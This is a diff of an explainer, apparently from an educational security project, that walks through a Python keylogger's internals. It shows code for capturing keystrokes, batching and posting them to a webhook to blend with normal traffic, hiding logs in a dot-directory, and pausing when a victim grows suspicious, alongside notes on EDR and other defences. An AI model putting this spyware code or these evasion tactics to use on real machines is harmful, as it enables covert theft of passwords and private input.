@@ -26,11 +26,11 @@ User Space Applications
    Hardware Controller
 ```
 
-The pynput library we use (`keylogger.py:29`) hooks into user space event listeners. On Linux it monitors X11 or Wayland events. On macOS it uses the Accessibility API. On Windows it sets up a low-level keyboard hook via SetWindowsHookEx under the hood.
+The pynput library we use (`keylogger.py:43`) hooks into user space event listeners. On Linux it monitors X11 or Wayland events. On macOS it uses the Accessibility API. On Windows it sets up a low-level keyboard hook via SetWindowsHookEx under the hood.
 
 When a key is pressed, the OS delivers it to all registered listeners before the application processes it. This is why keyloggers see passwords even when they're typed into password fields that display asterisks.
 
-In our implementation (`keylogger.py:367-383`):
+In our implementation (`keylogger.py:428-458`):
 ```python
 def _on_press(self, key: Key | KeyCode) -> None:
     """
@@ -63,7 +63,7 @@ Every keystroke triggers this callback. The function processes the key, determin
 
 **Keystroke Encryption**: Tools like KeyScrambler encrypt keystrokes at the kernel level before they reach applications. This requires a kernel driver that intercepts events lower in the stack than user space keyloggers can access.
 
-**Behavioral Detection**: EDR (Endpoint Detection and Response) systems look for suspicious patterns like reading keyboard events from non-GUI applications, accessing processes they shouldn't, or making network connections to known C2 servers. Our webhook delivery (`keylogger.py:234-255`) would trigger alerts in mature EDR systems.
+**Behavioral Detection**: EDR (Endpoint Detection and Response) systems look for suspicious patterns like reading keyboard events from non-GUI applications, accessing processes they shouldn't, or making network connections to known C2 servers. Our webhook delivery (`keylogger.py:326-357`) would trigger alerts in mature EDR systems.
 
 **Hardware Security**: Some enterprises issue hardware security keys (YubiKey, etc) for authentication. Physical key presses can't be captured by software keyloggers since the authentication happens on the device.
 
@@ -79,31 +79,31 @@ In the 2020 SolarWinds breach, attackers spent months inside networks exfiltrati
 
 ### How It Works
 
-Our keylogger uses webhook delivery over HTTPS (`keylogger.py:234-255`):
+Our keylogger uses webhook delivery over HTTPS (`keylogger.py:326-357`):
 
 ```python
-def _deliver_batch(self) -> None:
+def _deliver_batch(self, events: list[KeyEvent]) -> None:
     """
-    Deliver buffered events to webhook endpoint
+    POST buffered events to the webhook endpoint
     """
-    if not self.event_buffer or not self.config.webhook_url:
+    if not events or not self.config.webhook_url:
         return
 
     payload = {
         "timestamp": datetime.now().isoformat(),
         "host": platform.node(),
-        "events": [event.to_dict() for event in self.event_buffer]
+        "events": [e.to_dict() for e in events],
     }
 
     try:
         response = requests.post(
             self.config.webhook_url,
             json=payload,
-            timeout=5
+            timeout=WEBHOOK_TIMEOUT_SECS,
         )
 ```
 
-This looks like normal application traffic. It uses HTTPS (encrypted), posts to what appears to be a legitimate webhook endpoint, and batches events to reduce network noise. The `webhook_batch_size` parameter (`keylogger.py:67`) controls how many keystrokes accumulate before transmission.
+This looks like normal application traffic. It uses HTTPS (encrypted), posts to what appears to be a legitimate webhook endpoint, and batches events to reduce network noise. The `webhook_batch_size` parameter (`keylogger.py:116`) controls how many keystrokes accumulate before transmission.
 
 Common exfiltration channels:
 - **HTTP/HTTPS POST**: Looks like API traffic, blends with normal web requests
@@ -124,16 +124,20 @@ def _on_press(self, key):
 This creates massive network traffic and is easily detected. Every keystroke generates an HTTPS request, which network monitoring flags as anomalous.
 
 ```python
-# Good: Batch events (keylogger.py:222-232)
+# Good: Batch events with buffer swap (keylogger.py:308-324)
 def add_event(self, event: KeyEvent) -> None:
     if not self.enabled:
         return
-    
+
+    batch: list[KeyEvent] | None = None
     with self.buffer_lock:
         self.event_buffer.append(event)
-        
         if len(self.event_buffer) >= self.config.webhook_batch_size:
-            self._deliver_batch()
+            batch = self.event_buffer
+            self.event_buffer = []
+
+    if batch:
+        self._deliver_batch(batch)
 ```
 
 Batching reduces network calls by 50x or more. Sending 50 keystrokes in one request looks like a normal form submission.
@@ -146,7 +150,7 @@ requests.post(webhook_url, json=payload)
 
 If the webhook is unreachable, keystrokes are lost forever. Sophisticated malware persists data locally and retries.
 
-Our implementation logs to disk first (`keylogger.py:184-189`), then sends to webhook. If delivery fails, logs remain on disk for later exfiltration.
+Our implementation logs to disk first (`keylogger.py:248-255`), then sends to webhook. If delivery fails, logs remain on disk for later exfiltration.
 
 ## Cross-Platform Malware Development
 
@@ -156,29 +160,30 @@ Malware that runs on multiple operating systems (Windows, macOS, Linux) using pl
 
 ### How It Works
 
-Our keylogger detects the platform and loads appropriate modules (`keylogger.py:35-54`):
+Our keylogger detects the platform and loads appropriate modules (`keylogger.py:53-68`):
 
 ```python
-if platform.system() == "Windows":
+WINDOWS = "Windows"
+DARWIN = "Darwin"
+LINUX = "Linux"
+
+if platform.system() == WINDOWS:
     try:
         import win32gui
         import win32process
         import psutil
     except ImportError:
         win32gui = None
-elif platform.system() == "Darwin":
+elif platform.system() == DARWIN:
     try:
         from AppKit import NSWorkspace
     except ImportError:
         NSWorkspace = None
-elif platform.system() == "Linux":
-    try:
-        import subprocess
-    except ImportError:
-        subprocess = None
 ```
 
-The WindowTracker class (`keylogger.py:121-165`) implements platform-specific window detection:
+The `subprocess` module is imported unconditionally at module top level (line 27) since it's stdlib. Platform constants (`WINDOWS`, `DARWIN`, `LINUX`) eliminate repeated magic strings.
+
+The WindowTracker class (`keylogger.py:155-219`) implements platform-specific window detection:
 - Windows: Uses win32gui to get foreground window handle, then psutil for process info
 - macOS: Uses NSWorkspace to query the active application
 - Linux: Shells out to xdotool to get window title
@@ -197,28 +202,34 @@ The strategy for storing captured data locally without filling the disk or creat
 
 ### How It Works
 
-Our LogManager (`keylogger.py:168-218`) implements automatic rotation:
+Our LogManager (`keylogger.py:222-296`) implements automatic rotation using direct file I/O:
 
 ```python
 def _check_rotation(self) -> None:
     """
-    Check if log rotation is needed based on file size
+    Rotate log file when size limit is reached
     """
-    current_size_mb = self.current_log_path.stat().st_size / (1024 * 1024)
-    
-    if current_size_mb >= self.config.max_log_size_mb:
-        self.logger.handlers[0].close()
-        self.logger.removeHandler(self.logger.handlers[0])
-        
-        self.current_log_path = self._get_new_log_path()
-        handler = logging.FileHandler(self.current_log_path)
-        handler.setFormatter(logging.Formatter('%(message)s'))
-        self.logger.addHandler(handler)
+    try:
+        size = self.current_log_path.stat().st_size
+    except FileNotFoundError:
+        self._rotate()
+        return
+
+    if size / BYTES_PER_MB >= self.config.max_log_size_mb:
+        self._rotate()
+
+def _rotate(self) -> None:
+    """
+    Close current log file and open a new one
+    """
+    self._file.close()
+    self.current_log_path = self._get_new_log_path()
+    self._file = open(self.current_log_path, 'a', encoding='utf-8')
 ```
 
-When a log file reaches the size limit (default 5MB), the logger closes it and creates a new file with a fresh timestamp. This prevents any single file from growing suspiciously large.
+When a log file reaches the size limit (default 5MB), LogManager closes the file handle and opens a new one with a fresh timestamp (including microseconds for uniqueness). If the log file is deleted externally, `FileNotFoundError` triggers a rotation to recover gracefully.
 
-The default config (`keylogger.py:65`) stores logs in `~/.keylogger_logs`, a hidden directory (leading dot) that won't appear in casual file browsing on Unix systems.
+The default config (`keylogger.py:112`) stores logs in `~/.keylogger_logs`, a hidden directory (leading dot) that won't appear in casual file browsing on Unix systems.
 
 ### Common Attacks
 
@@ -237,19 +248,21 @@ Techniques to avoid detection by antivirus, EDR systems, network monitoring, and
 
 ### How It Works
 
-Our keylogger includes a toggle key (`keylogger.py:386-393`):
+Our keylogger includes a toggle key (`keylogger.py:460-477`):
 
 ```python
 def _toggle_logging(self) -> None:
     """
-    Toggle logging on/off with F9 key
+    Toggle logging on/off with the configured key
     """
+    toggle = self.config.toggle_key.name.upper()
+
     if self.is_logging.is_set():
         self.is_logging.clear()
-        print("\n[*] Logging paused. Press F9 to resume.")
+        print(f"\n[*] Logging paused. Press {toggle} to resume.")
     else:
         self.is_logging.set()
-        print("\n[*] Logging resumed. Press F9 to pause.")
+        print(f"\n[*] Logging resumed. Press {toggle} to pause.")
 ```
 
 This allows quick pausing if the victim becomes suspicious. More sophisticated malware uses process hiding, rootkit techniques, or even monitors for forensic tools and shuts down when detected.
